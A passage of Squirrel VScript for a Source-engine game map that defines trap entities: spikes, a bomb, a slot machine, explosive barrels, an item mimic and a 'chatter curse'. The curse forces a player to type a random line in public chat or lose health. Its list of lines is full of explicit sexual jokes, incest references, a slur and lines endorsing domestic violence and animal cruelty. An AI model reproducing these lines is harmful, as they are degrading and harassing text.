						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(toucher.GetVelocity().Length()>::TRAPS.spikes.speed_run)
						{
							if(toucher.GetVelocity().z < -::TRAPS.spikes.speed_fall)
							{
								EntFireByHandle(toucher,"SetHealth",(toucher.GetHealth()-::TRAPS.spikes.damage_fall).tostring(),0.00,null,null);
								::Sound("*luffaren/sliced.mp3",toucher.GetOrigin()+Vector(0,0,8),null,10000,0.10,RandomInt(60,70),100);
								::Sound("*luffaren/sliced.mp3",toucher.GetOrigin()+Vector(0,0,8),null,10000,0.10,RandomInt(120,130),100);
								if(::TRAPS.spikes.print_chat)::PlayerNameMessage(toucher,""," got impaled by spikes");
							}
							else if(Vector(toucher.GetVelocity().x,toucher.GetVelocity().y,0).Length()>::TRAPS.spikes.speed_run)
							{
								EntFireByHandle(toucher,"SetHealth",(toucher.GetHealth()-::TRAPS.spikes.damage_run).tostring(),0.00,null,null);
								::Sound("*luffaren/sliced.mp3",toucher.GetOrigin()+Vector(0,0,8),null,10000,0.10,RandomInt(90,105),100);
								local vel = toucher.GetVelocity();
								vel.x = 0;
								vel.y = 0;
								toucher.SetVelocity(vel);
							}
							::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.05);
						}
					},function Run(){
						AddThinkToEnt(self,"Think");
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -25 -25 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 25 25 16",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	chatter_curse = {
			chatlist = [
					"i just farted really loud lol",
					"wtf my teeth are so yellow",
					"is it gay to take it up the ass",
					"its not gay to take it up the ass",
					"fuck my tight little hot pot pussy",
					"my gf became pregnant yesterday",
					"ill snap your cock inside my ass",
					"lemme brush my teeth with ur cock",
					"cant wait to suck off my bf later",
					"ima ask mom to make me dino nuggies",
					"my dad says i got birthgiving hips",
					"subscribe to luffaren on patreon",
					"my fingers are so fucking greasy",
					"fucking poop ass balls tits fuck shit",
					"ugh i feel so horny right now",
					"i fingered my brother once lol",
					"my lips are meant for sucking",
					"defend if ur retarted haha loser",
					"ima doorhug dont gust me",
					"my irl friends call me a cum dumpster",
					"ill make you cum with my plump thighs",
					"add me on steam for feet pics",
					"im a twink boy with a tight anus",
					"i wanna gag on some hot steamy feet",
					"my bf came in me last night what do i do",
					"i always dreamt of becoming a cuck",
					"googo gaga waah baby want milkies",
					"i get really turned on by you",
					"licking your own ass is hard af lol",
					"i drink starbucks every single day",
					"this map is the best map of all maps",
					"my tits are starting to sag",
					"my dick is actually really small tbh",
					"my muscles are super big and cool i swear",
					"guys steroids arent bad right",
					"guys steroids are honestly pretty legit",
					"my tight hole is first come first serve",
					"im high as fuck",
					"i tried eating dog and its actually pretty good",
					"brb my boyfriend is calling me",
					"i think domestic violence should be legal",
					"my ass is grass and i want u to smoke it",
					"fuck i just realized i smell really bad atm",
					"in full honesty cum doesnt actually taste that bad",
					"let it be known that im gay",
					"i wish that someone would peg me",
					"is it weird that i find my mom hot",
					"i just want a bro to cum in me",
					"i dare an admin to kick me",
					"lemme drink your drool",
					"i suck the contents of popped pimples",
					"yo are any girls on the server rn",
					"hey any girls here add me haha",
					"fuck this ima pump my dick to xvideos",
					"i wish this map had lasers",
					"bro i kick dogs for fun ur a pussy",
					"i deadlift 25kg im getting there",
					"how do i get rid of itchy dick",
					"are buttplugs expensive",
					"giv eme your item plz",
					"fuck my tight little zombie pussy",
					"fuck yuor dont fall back bitchs",
					"abcdefghijklmnopqrstuvwxyz",
					"how do i use items",
					"admin slay me you wont pussy",
					"admin please slap me",
					"admin fuck you fuck you fuck",
					"fuck i think i shat myself for real",
					"do me harder oh yeah ah ooh",
					"guys i cant hold it in anymore",
					"you suck let me suck you better",
					"i can lead this map better than you",
					"anyone wanna play fortnite with me",
					"anyone wanna play roblox with me",
					"im high as fuck",
					"god i wish i could get laid",
					"how do i get girl to touch my peepe",
					"i pledge to do my part for the collective",
					"i want luffaren to take my virginity",
					"these zombie models make me horny",
					"i did not cum on my cat",
				],
				gametext_channel = 3,
				tickrate = 0.80,
				hurtamount = 2,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/roar.mdl");
			::Ent(pos+Vector(0,0,5),rot+Vector(-90,0,0),"prop_dynamic",{
					model="models/luffaren/roar.mdl",
					modelscale = 1.00,		//__CSS__ og was 2.00
					rendermode = 1,
					renderamt = 50,
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					function Touch(){
						if(touched)return;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						toucher.ValidateScriptScope();
						if("chatter_cursed" in toucher.GetScriptScope())return;
						touched = true;
						EntFireByHandle(model,"Kill","",0.00,null,null);
						EntFireByHandle(self,"Kill","",0.00,null,null);
						::TRAPS.chatter_curse.CursePlayer(toucher);
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -5 -5 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 5 5 2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		},
		function CursePlayer(player)
		{
			if(player==null||!player.IsValid())return;
			player.ValidateScriptScope();
			if("chatter_cursed" in player.GetScriptScope())return;
			player.GetScriptScope().chatter_cursed <- true;
			::Ent(Vector(),Vector(),"logic_relay",{},{
				victim = player,
				message = null,
				ticking = true,
				function Tick(){
					if(!ticking){
						EntFireByHandle(self,"Kill","",0.00,null,null);
						if(victim==null||!victim.IsValid()){}else{
							victim.ValidateScriptScope();
							if("chatter_cursed" in victim.GetScriptScope())delete victim.GetScriptScope().chatter_cursed;}
						return;}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",::TRAPS.chatter_curse.tickrate,null,null);
					if(victim==null||!victim.IsValid()||victim.IsAlive()==false||victim.GetTeam()!=3){
						ticking = false;
						return;}
					::chattercurse_text.__KeyValueFromString("message","     [YOU HAVE BEEN CURSED]\nWrite the following message in chat or die:\n\n"+message);
					EntFireByHandle(::chattercurse_text,"Display","",0.00,victim,null);
					EntFireByHandle(victim,"SetHealth",(victim.GetHealth()-::TRAPS.chatter_curse.hurtamount).tostring(),0.00,null,null);
				},function Run(){
					::Sound("*luffaren/fart_reverb.mp3",Vector(),victim,-1,0.20,100,10);
					message = ""+::TRAPS.chatter_curse.chatlist[RandomInt(0,::TRAPS.chatter_curse.chatlist.len()-1)];
					if(!("chattercurse_text" in this))::chattercurse_text <- null;
					if(::chattercurse_text==null||!::chattercurse_text.IsValid()){
						::chattercurse_text = Entities.CreateByClassname("game_text");
						::chattercurse_text.__KeyValueFromString("message","");
						::chattercurse_text.__KeyValueFromFloat("x",0.02);
						::chattercurse_text.__KeyValueFromFloat("y",0.45);
						::chattercurse_text.__KeyValueFromFloat("fadein",0.00);
						::chattercurse_text.__KeyValueFromFloat("fadeout",0.00);
						::chattercurse_text.__KeyValueFromFloat("holdtime",::TRAPS.chatter_curse.tickrate+0.20);
						::chattercurse_text.__KeyValueFromInt("channel",::TRAPS.chatter_curse.gametext_channel);
						::chattercurse_text.__KeyValueFromInt("effect",0);
						::chattercurse_text.__KeyValueFromVector("color",Vector(255,200,0));}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
					local pc = ::GetPlayerClass(victim);
					if(pc==null||pc.userid==null){
						EntFireByHandle(self,"Kill","",0.00,null,null);
						return;}
					::EventListener("player_say",{
						ent = self,
						entindex = self.entindex(),
						gottaclean = false,
						userid = pc.userid,
						message = message,
						function Tick(){
							if(gottaclean){
								EntFireByHandle(handle,"Kill","",0.00,null,null);
								return;}
							EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
							if(ent==null||!ent.IsValid())gottaclean = true;
						},function EventFired(name,data){
							if(ent==null||!ent.IsValid())return;
							if(data.userid == userid && data.text.tolower() == message.tolower()){
								ent.ValidateScriptScope();
								ent.GetScriptScope().ticking = false;
								gottaclean = true;
								::Sound("*luffaren/huh.mp3",Vector(),ent.GetScriptScope().victim,-1,0.20,100,10);}
						},function Run(){
							EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",0.10,null,null);
						}});
				}});
		}
	},
	guster = {
			trigger_size = 300,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/gust.mdl");
			::Ent(pos+Vector(0,0,40),rot+Vector(-90,0,0),"prop_dynamic",{
					model="models/luffaren/gust.mdl",
					modelscale = 1.50,
					rendermode = 1,
					renderamt = 180,
					rendercolor = "0 0 0",
				},{function Tick(){
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.03,null,null);
					local newang = Vector(-90,self.GetAngles().y+25,0);
					if(newang.y>360)newang.y-=360;
					self.SetAngles(newang.x,newang.y,newang.z);
				},function Run(){
				::CreateCostCleaner(self,2);
				EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.03,null,null);
				::Ent(self.GetOrigin(),Vector(0,self.GetAngles(),0),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(self,"Kill","",0.00,null,null);
						EntFireByHandle(model,"Kill","",0.00,null,null);
						local pos = toucher.GetOrigin()+Vector(0,0,40);
						local dir = pos - self.GetOrigin();
						dir.Norm();
						::ITEMS.gust.SpawnGust(self.GetOrigin(),::DirToAngles(dir));
						::Sound("*luffaren/punch.mp3",self.GetOrigin(),null,5000,0.50,RandomInt(30,35),10);
						if(::TRAPS.guster.print_chat)::PlayerNameMessage(toucher,""," triggered a guster");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						local tz = (0+::TRAPS.guster.trigger_size).tostring();
						EntFireByHandle(self,"AddOutput","mins -"+tz+" -"+tz+" -100",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs "+tz+" "+tz+" 200",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	slotmachine = {
			magnitude = 200,
			radiusoverride = 0,
			winchance = 10.00,
			maxuses_min = 1,
			maxuses_max = 20,
			win_hpadd = 150,
			lose_hpremove = 18,
			explode_minislot_spawnchance = 40.00,
			explode_minislot_max_allowed = 5,
			print_names = true,
		function Spawn(pos,rot=null,postileoffset=true){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			if(postileoffset)
			{
				local offsets = [-25,25];
				pos += Vector(offsets[RandomInt(0,offsets.len()-1)],offsets[RandomInt(0,offsets.len()-1)],0);
			}
			//::manager.PrecacheModel("models/luffaren/slotmachine.mdl");
			::Ent(pos,rot,"prop_physics_override",{
					model="models/luffaren/slotmachine.mdl",
					spawnflags = 266,
					rendermode = 1,
					renderamt = 0,
					DisableBoneFollowers = true,
				},{
				model = null,
				in_use = false,
				maxuses = 10,
				bufferplayer = null,
				function Destroy(){
					EntFireByHandle(self,"Kill","",0.00,null,null);
					if(RandomFloat(0.00,100.00)<=::TRAPS.slotmachine.explode_minislot_spawnchance)
					{
						local ms_count = 0;
						for(local h;h=Entities.FindByName(h,"item_minislots");)
						{
							if(h==null||!h.IsValid())continue;
							ms_count++;
						}
						if(ms_count < ::TRAPS.slotmachine.explode_minislot_max_allowed)
							::ITEMS.minislots.Spawn(self.GetOrigin()+Vector(0,0,40));
					}
					::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin()+Vector(0,0,48),null,5000,0.20,RandomInt(60,80),10);
					::Sound("weapons/g3sg1/g3sg1_distant_01.wav",self.GetOrigin()+Vector(0,0,48),null,20000,0.20,RandomInt(60,80),10);
					::Ent(self.GetOrigin()+Vector(0,0,32),Vector(),"env_explosion",{
							//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
							iMagnitude = (0+::TRAPS.slotmachine.magnitude),
							iRadiusOverride = (0+::TRAPS.slotmachine.radiusoverride),
							rendermode = 5,
							spawnflags = 2,
							rendercolor = "255 255 255",
						},{function Run(){
							EntFireByHandle(self,"Explode","",0.01,null,null);
							EntFireByHandle(self,"Kill","",0.05,null,null);
						}});
				},function WinCheck(){
					local anim = "lose";
					if(RandomFloat(0.00,100.00) <= ::TRAPS.slotmachine.winchance)
					{
						anim = "win";
						::Sound("*luffaren/slotmachine_reward.mp3",self.GetOrigin()+Vector(0,0,48),null,10000,0.80,RandomInt(98,102),10);
						if(bufferplayer==null||!bufferplayer.IsValid()||bufferplayer.GetTeam()!=3||bufferplayer.IsAlive()==false){}else
						{
							local newhp = bufferplayer.GetHealth()+::TRAPS.slotmachine.win_hpadd;
							EntFireByHandle(bufferplayer,"AddOutput","health "+newhp.tostring(),0.00,null,null);
						}
					}
					else
					{
						::Sound("*luffaren/slotmachine_debuff.mp3",self.GetOrigin()+Vector(0,0,48),null,10000,0.80,RandomInt(98,102),10);
						if(bufferplayer==null||!bufferplayer.IsValid()||bufferplayer.GetTeam()!=3||bufferplayer.IsAlive()==false){}else
						{
							local newhp = bufferplayer.GetHealth()-::TRAPS.slotmachine.lose_hpremove;
							if(newhp<=0)EntFireByHandle(bufferplayer,"SetHealth","-1",0.00,null,null);
							else EntFireByHandle(bufferplayer,"AddOutput","health "+newhp.tostring(),0.00,null,null);
						}
					}
					EntFireByHandle(model,"SetAnimation",anim,0.00,null,null);
					EntFireByHandle(model,"SetDefaultAnimation",anim,0.02,null,null);
					if(::TRAPS.slotmachine.print_names)
					{
						local msg = "won!";
						if(anim=="lose")msg = "lost...";
						::PlayerNameMessage(bufferplayer,""," gambled and "+msg);
					}
				},
				//function Used(){
				function InputUse(){		//__CSS__ no player_use
					if(in_use)return;
					local user = activator;
					if(user==null||!user.IsValid()||user.GetTeam()!=3||user.IsAlive()==false)return;
					in_use = true;
					maxuses--;
					if(maxuses<0)
					{
						Destroy();
						if(::TRAPS.slotmachine.print_names)
							::PlayerNameMessage(user,""," gambled and exploded!");
						return;
					}
					bufferplayer = user;
					EntFireByHandle(self,"RunScriptCode"," WinCheck(); ",0.80,null,null);
					EntFireByHandle(self,"RunScriptCode"," in_use = false; ",1.80,null,null);
					EntFireByHandle(model,"SetAnimation","spin",0.00,null,null);
					EntFireByHandle(model,"SetDefaultAnimation","spin",0.02,null,null);
					EntFireByHandle(model,"SetPlaybackRate","11.00",0.03,null,null);
					::Sound("*luffaren/slotmachine_roll.mp3",self.GetOrigin()+Vector(0,0,48),null,10000,0.80,RandomInt(98,102),10);
				},function Run(){
					Inputuse <- InputUse;	//__CSS__ no player_use
					::CreateCostCleaner(self,3);
					::CreateTemCleaner(self,{
						main=self,
						function Clean(){
							if(main==null||!main.IsValid()){}else EntFireByHandle(main,"Kill","",0.00,null,null);
						}});
					maxuses = RandomInt(::TRAPS.slotmachine.maxuses_min,::TRAPS.slotmachine.maxuses_max);
						//EntFireByHandle(self,"AddOutput","OnPlayerUse !self:RunScriptCode:Used();:0:-1",0.00,null,null);
					::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{
							model="models/luffaren/slotmachine.mdl",
							spawnflags = 256,
						},{
						master = self,
						function Run(){
							master.GetScriptScope().model = self;
							EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
							EntFireByHandle(self,"SetAnimation","win",0.00,null,null);
							EntFireByHandle(self,"SetDefaultAnimation","win",0.02,null,null);
						}});
					
					
					
					//__CSS__ no player_use
					/*
					::EventListener("player_use",{
						master = self,
						function Tick(){
							if(master==null||!master.IsValid())
							{
								EntFireByHandle(handle,"Kill","",0.00,null,null);
								return;
							}
							EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
						},function Run(){
							EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
						},function EventFired(name,data){
							if(master==null||!master.IsValid())return;
							if(data.entity != master.entindex())return;
							local pc = ::GetPlayerClass(data.userid);
							if(pc==null)return;
							EntFireByHandle(master,"RunScriptCode"," Used(); ",0.00,pc.handle,null);
						}});
					*/
					
					
				}});
		}
	},
	bomb = {
			trigger_size = 150,
			explode_time = 8.00,
			explode_magnitude = 400,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/props/de_dust/palacemeddomeskybox.mdl");
			::manager.PrecacheModel("models/props_c17/light_domelight02_off.mdl");
			::Ent(pos,rot+Vector(180,0,0),"prop_dynamic",{						//__CSS__ flipped 180 degrees upside down (new model)
					//model="models/props/de_dust/palacemeddomeskybox.mdl",		//__CSS__ <og - doesn't exist in CSS
					model="models/props_c17/light_domelight02_off.mdl",
					modelscale = 1.00,			//__CSS__ og was 2.00
					rendermode = 1,
					renderamt = 100,
					rendercolor = "255 200 200",
					glowenabled = 1,
					glowdist = 1500,
					glowstyle = 1,
					glowcolor = "150 100 0",
				},{
				function Run(){
				::CreateCostCleaner(self,2);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					glowstate = 1,
					rate = 1.00,
					beep_pitch = 80,
					exploded = false,
					function Explode(){
						exploded = true;
						::Sound("*weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin()+Vector(0,0,8),null,50000,0.10,RandomInt(90,110),100);
						::Sound("*weapons/c4/c4_explode1.wav",self.GetOrigin()+Vector(0,0,8),null,50000,0.10,RandomInt(90,110),100);
						::Particle("explosion_huge_h",self.GetOrigin(),Vector(),null,0.05);
						::Particle("blood_impact_synth_01_droplets",self.GetOrigin(),Vector(),null,0.05);
						::Particle("water_splash_01_refract",self.GetOrigin(),Vector(),null,0.05);
						::Particle("blood_impact_green_02_chunk",self.GetOrigin(),Vector(),null,0.05);
						::Ent(self.GetOrigin()+Vector(0,0,32),Vector(),"env_explosion",{
								//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
								iMagnitude = (0+::TRAPS.bomb.explode_magnitude),
								rendermode = 5,
								rendercolor = "255 255 255",
							},{function Run(){
								EntFireByHandle(self,"Explode","",0.00,null,null);
								EntFireByHandle(self,"Kill","",0.10,null,null);
							}});
					},function TickCountDown(){
						if(exploded)
						{
							EntFireByHandle(self,"Kill","",0.00,null,null);
							EntFireByHandle(model,"Kill","",0.00,null,null);
							return;
						}
						glowstate++;if(glowstate>1)glowstate=0;
						EntFireByHandle(model,"AddOutput","glowstyle "+glowstate.tostring(),0.00,null,null);
						rate -= 0.08;
						beep_pitch += 5;
						if(rate<0.15)rate=0.15;		//was 0.10 in v1_5 and older
						EntFireByHandle(self,"RunScriptCode"," TickCountDown(); ",rate,null,null);
						::Particle("muzzle_rifles",self.GetOrigin()+Vector(0,0,8),Vector(),null,0.02);
						::Sound("*weapons/hegrenade/beep.wav",self.GetOrigin()+Vector(0,0,8),null,5000,0.02,beep_pitch,100);
					},function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(model,"AddOutput","glowcolor 255 0 0",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowdist 50000",0.00,null,null);
						EntFireByHandle(model,"AddOutput","modelscale 1.20",0.00,null,null);
						::Sound("*player/vo/seal_epic/bomb_pre_explosion_03.wav",self.GetOrigin()+Vector(0,0,8),null,20000,0.10,RandomInt(90,110),100);
						::Particle("muzzle_rifles",self.GetOrigin()+Vector(0,0,8),Vector(),null,0.05);
						EntFireByHandle(self,"RunScriptCode"," TickCountDown(); ",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode"," Explode(); ",::TRAPS.bomb.explode_time,null,null);
						if(::TRAPS.bomb.print_chat)::PlayerNameMessage(toucher,""," triggered a bomb");
					},function Run(){
						::CreateTemCleaner(self,{
							model=model,
							trigger=self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						local tz = (0+::TRAPS.bomb.trigger_size).tostring();
						EntFireByHandle(self,"AddOutput","mins -"+tz+" -"+tz+" -100",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs "+tz+" "+tz+" 200",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:1",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.10,null,null);
					}});
			}});
		}
	},
	explosive_barrel = {
			hithealth_min = 1,
			hithealth_max = 30,
			magnitude = 200,
			radiusoverride = 0,
			ignite_time = 5.00,
			ignite_range = 200,	
		function Spawn(pos,rot=null,postileoffset=true){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			if(postileoffset)
			{
				local offsets = [-15,15];
				pos += Vector(offsets[RandomInt(0,offsets.len()-1)],offsets[RandomInt(0,offsets.len()-1)],0);
			}
			//::manager.PrecacheModel("models/luffaren/explosive_barrel.mdl");
			::Ent(pos,rot,"prop_physics_override",{
					model="models/luffaren/explosive_barrel.mdl",
					spawnflags = 10,
					rendermode = 1,
					DisableBoneFollowers = true,
				},{
				health = 0,
				color_cd = false,
				function Damaged(){
					if(health<=0)return;
					health--;
					if(health<=0)
					{
						EntFireByHandle(self,"Kill","",0.00,null,null);
						::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin()+Vector(0,0,48),null,5000,0.20,RandomInt(60,80),10);
						::Sound("weapons/g3sg1/g3sg1_distant_01.wav",self.GetOrigin()+Vector(0,0,48),null,20000,0.20,RandomInt(60,80),10);
						::Ent(self.GetOrigin()+Vector(0,0,32),Vector(),"env_explosion",{
								//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
								iMagnitude = (0+::TRAPS.explosive_barrel.magnitude),
								iRadiusOverride = (0+::TRAPS.explosive_barrel.radiusoverride),
								rendermode = 5,
								spawnflags = 2,
								rendercolor = "255 255 255",
							},{function Run(){
								EntFireByHandle(self,"Explode","",0.01,null,null);
								EntFireByHandle(self,"Kill","",0.05,null,null);
							}});
						for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::TRAPS.explosive_barrel.ignite_range);)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
							EntFireByHandle(h,"IgniteLifeTime",::TRAPS.explosive_barrel.ignite_time.tostring(),0.00,null,null);
						}
						::PlayerNameMessage(activator,""," blew up an explosive barrel",0.00);
						return;
					}
					if(color_cd)return;
					color_cd=true;
					EntFireByHandle(self,"RunScriptCode"," color_cd=false; ",0.06,null,null);
					EntFireByHandle(self,"AddOutput","rendercolor 200 0 0",0.00,null,null);
					EntFireByHandle(self,"AddOutput","rendercolor 255 255 255",0.05,null,null);
				},function Run(){
					::CreateCostCleaner(self,1);
					::CreateTemCleaner(self,{
						main=self,
						function Clean(){
							if(main==null||!main.IsValid()){}else EntFireByHandle(main,"Kill","",0.00,null,null);
						}});
					health = RandomInt(::TRAPS.explosive_barrel.hithealth_min,::TRAPS.explosive_barrel.hithealth_max);
					EntFireByHandle(self,"AddOutput","OnTakeDamage !self:RunScriptCode:Damaged();:0:-1",0.05,null,null);
				}});
		}
	},
	mimic = {
			weapon_modelscale = 1.5,
			print_chat = true,
		function Spawn(pos,rot=null){
			if(rot==null)rot = Vector(0,RandomFloat(0,360),0);
			//::manager.PrecacheModel("models/luffaren/beartrap.mdl");
			::Ent(pos,rot,"prop_dynamic",{
					model="models/luffaren/beartrap.mdl",
					modelscale = 1.80,
					rendermode = 1,
					renderamt = 50,
					rendercolor = "255 0 0",
					glowenabled = 0,
					glowdist = 1000,
					glowstyle = 1,
					glowcolor = "100 0 0",
					StartDisabled = "1",
				},{
				function Run(){
				EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
				EntFireByHandle(self,"SetDefaultAnimation","idle",0.02,null,null);
				::CreateCostCleaner(self,10);
				::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					model = self,
					touched = false,
					itemholder = null,
					function Touch(){
						if(touched)return;
						touched = true;
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						EntFireByHandle(itemholder,"Kill","",0.00,null,null);
						EntFireByHandle(self,"Kill","",0.00,null,null);
						EntFireByHandle(model,"RunScriptCode"," self.SetOrigin(self.GetOrigin()+Vector(0,0,-8)); ",0.00,null,null);
						EntFireByHandle(model,"RunScriptCode"," self.SetAngles(0,RandomFloat(0,360),0); ",0.00,null,null);
						EntFireByHandle(model,"Enable","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","glowenabled 1",0.00,null,null);
						EntFireByHandle(model,"SetAnimation","snap",0.01,null,null);
						EntFireByHandle(model,"SetDefaultAnimation","snapped",0.03,null,null);
						//EntFireByHandle(model,"fadeandkill","0.2",0.30,null,null);
						::FadeAndKill(model,0.20,0.30);		//__CSS__ fadeandkill doesn't exist in css
						if(::TRAPS.mimic.print_chat)::PlayerNameMessage(toucher,"Beware item-mimics! ("," fell for it)");
						else ::ServerSay("say Beware item-mimics!",0.00,null);
						EntFireByHandle(toucher,"SetHealth","-1",0.00,null,null);
						::Sound("*luffaren/pizza_splotion.mp3",self.GetOrigin()+Vector(0,0,8),null,2000,0.10,RandomInt(40,50),100);
						::Sound("*luffaren/sliced.mp3",self.GetOrigin()+Vector(0,0,8),null,5000,0.10,RandomInt(200,255),100);
						::Particle("blood_advisor_puncture_withdraw",toucher.GetOrigin(),Vector(90+RandomInt(-15,15),RandomInt(0,360),RandomInt(-15,15)),null,0.10);
					},function RunPost(){
						local h=Entities.FindByNameNearest("itemholder_striptrigger",self.GetOrigin()+Vector(0,0,40),16);
						if(h!=null)EntFireByHandle(h,"Kill","",0.00,null,null);
						h=null;h=Entities.FindByNameNearest("itemholder",self.GetOrigin()+Vector(0,0,40),16);
						if(h!=null)
						{
							EntFireByHandle(h,"AddOutput","modelscale "+::TRAPS.mimic.weapon_modelscale.tostring(),0.00,null,null);
							EntFireByHandle(h,"AddOutput","rendermode 1",0.00,null,null);
							EntFireByHandle(h,"AddOutput","rendercolor 255 0 0",0.00,null,null);
							//EntFireByHandle(h,"ToggleCanBePickedUp","",0.05,null,null);		//__CSS__ spawnflags are used now (3)
							EntFireByHandle(h,"AddOutput","spawnflags 3",0.00,null,null);		//__CSS__ spawnflags are used now (3)
							EntFireByHandle(h,"AddOutput","spawnflags 3",0.05,null,null);		//__CSS__ spawnflags are used now (3)
							EntFireByHandle(h,"AddOutput","spawnflags 3",0.15,null,null);		//__CSS__ spawnflags are used now (3)
							EntFireByHandle(h,"AddOutput","spawnflags 3",0.50,null,null);		//__CSS__ spawnflags are used now (3)
							EntFireByHandle(h,"AddOutput","OnPlayerPickup !self:Kill::0:1",0.00,null,null);
							itemholder = h;
						}
						else printl("[::TRAPS.mimic error]: 'itemholder' ent not found!");
					},function Run(){
						::CreateTemCleaner(self,{
							model = model,
							trigger = self,
							function Clean(){
								if(model==null||!model.IsValid()){}else EntFireByHandle(model,"Kill","",0.00,null,null);
								if(trigger==null||!trigger.IsValid()){}else EntFireByHandle(trigger,"Kill","",0.00,null,null);
							}});
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","mins -2 -2 -1",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 2 2 2",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:1",0.00,null,null);
